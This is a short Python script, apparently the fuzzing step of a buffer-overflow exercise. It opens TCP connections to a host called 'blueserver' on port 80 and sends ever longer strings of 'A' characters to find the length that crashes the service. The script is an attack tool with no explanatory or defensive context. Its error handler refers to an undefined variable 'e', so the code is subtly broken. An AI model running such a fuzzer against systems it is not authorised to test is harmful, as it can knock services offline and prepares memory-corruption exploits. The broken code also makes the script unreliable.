import socket
import sys

target_ip = "blueserver"
target_port = 80

buffer = ['\x41']
counter = 100
while len(buffer) <= 10:
    buffer.append('\x41' * counter)
    counter += 100
try:
    for string in buffer:
        print(f'Sending {len(string)} bytes...')
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip,target_port))
        s.recv(1024)
        s.send((string + '\r\n').encode())
        print ('Bytes sent.')
except:
    print(f'Unable to connect to the application. Reason: {e}.')
    sys.exit(0)
finally:
	s.close()
